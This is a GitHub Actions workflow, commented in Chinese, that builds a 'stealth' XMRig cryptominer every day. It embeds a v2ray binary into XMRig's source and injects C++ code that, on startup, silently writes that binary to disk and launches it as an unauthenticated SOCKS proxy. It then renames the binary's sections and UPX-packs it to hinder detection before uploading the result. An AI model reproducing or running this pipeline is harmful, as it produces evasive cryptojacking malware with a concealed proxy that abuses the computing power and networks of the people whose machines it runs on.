name: XMRig-v2ray AutoBuild

on:
  workflow_dispatch:
  schedule:
    - cron: '0 0 * * *'  # 每天自动构建

jobs:
  stealth-build:
    runs-on: ubuntu-22.04
    timeout-minutes: 35

    steps:
    # ========== 阶段1：获取最新代码 ==========
    - name: Clone XMRig (Latest)
      uses: actions/checkout@v4
      with:
        repository: xmrig/xmrig
        path: xmrig-src

    - name: Clone v2ray-core (Latest)
      uses: actions/checkout@v4
      with:
        repository: v2fly/v2ray-core
        path: v2ray-src

    # ========== 阶段2：环境预检 ==========
    - name: Verify Environments
      run: |
        echo "===== 系统信息 ====="
        uname -a
        echo "===== 磁盘空间 ====="
        df -h
        echo "===== 内存状态 ====="
        free -m

    # ========== 阶段3：Go环境配置 ==========
    - name: Setup Go 1.20
      uses: actions/setup-go@v4
      with:
        go-version: '1.20.7'  # 经过验证的稳定版本
        check-latest: false

    - name: Install Build Tools
      run: |
        sudo apt-get update
        sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
          build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
          upx-ucl xxd

    # ========== 阶段4：构建v2ray代理 ==========
    - name: Build v2ray
      working-directory: v2ray-src
      run: |
        # 动态获取最新稳定版本
        LATEST_TAG=$(git describe --tags `git rev-list --tags --max-count=1`)
        git checkout $LATEST_TAG
        
        # 构建可执行文件
        CGO_ENABLED=0 go build \
          -trimpath \
          -ldflags "-s -w -buildid=" \
          -o v2ray \
          ./main

    # ========== 阶段5：代码融合 ==========
    - name: Embed v2ray
      run: |
        # 将v2ray转换为C代码
        xxd -i v2ray-src/v2ray > xmrig-src/src/v2ray_embed.h

        # 生成默认配置
        mkdir -p xmrig-src/src/v2ray
        cat << EOF > xmrig-src/src/v2ray/config.json
        {
          "log": { "loglevel": "none" },
          "inbounds": [{
            "port": 10808,
            "protocol": "socks",
            "settings": {
              "auth": "noauth",
              "udp": true
            }
          }]
        }
        EOF

    # ========== 阶段6：修改XMRig源码 ==========
    - name: Modify XMRig
      working-directory: xmrig-src
      run: |
        # 自动获取最新提交
        git pull origin master

        # 注入代理启动代码
        cat << 'EOF' >> src/App.cpp
        #include "v2ray_embed.h"
        #include <cstdio>
        #include <cstdlib>
        #include <sys/stat.h>
        
        namespace xmrig {
            void StartProxy() {
                FILE* f = fopen("v2ray", "wb");
                if (f) {
                    fwrite(v2ray, 1, v2ray_len, f);
                    fclose(f);
                    chmod("v2ray", 0700);
                    system("./v2ray run -config=./src/v2ray/config.json >/dev/null 2>&1 &");
                }
            }
        }
        EOF

        # 在初始化时启动代理
        sed -i '/void Platform::init(/a \ \ \ \ StartProxy();' src/base/kernel/Platform.cpp

        # 更新构建配置
        sed -i '/set(HEADERS_CRYPTO/a \ \ \ \ "${CMAKE_SOURCE_DIR}/src/v2ray_embed.h"' CMakeLists.txt

    # ========== 阶段7：编译与混淆 ==========
    - name: Build & Protect
      working-directory: xmrig-src
      run: |
        mkdir -p build
        cd build
        
        # 标准编译配置
        cmake .. \
          -DWITH_HTTPD=OFF \
          -DWITH_OPENCL=OFF \
          -DWITH_CUDA=OFF \
          -DCMAKE_BUILD_TYPE=Release
        
        make -j$(nproc)

        # 二进制保护处理
        objcopy \
          --rename-section .text=.cryptext \
          --rename-section .data=.cryptdata \
          xmrig

        # 使用UPX压缩
        upx --ultra-brute --lzma xmrig -o xmrig_stealth

    # ========== 阶段8：结果发布 ==========
    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: xmrig-stealth
        path: xmrig-src/build/xmrig_stealth
        retention-days: 1
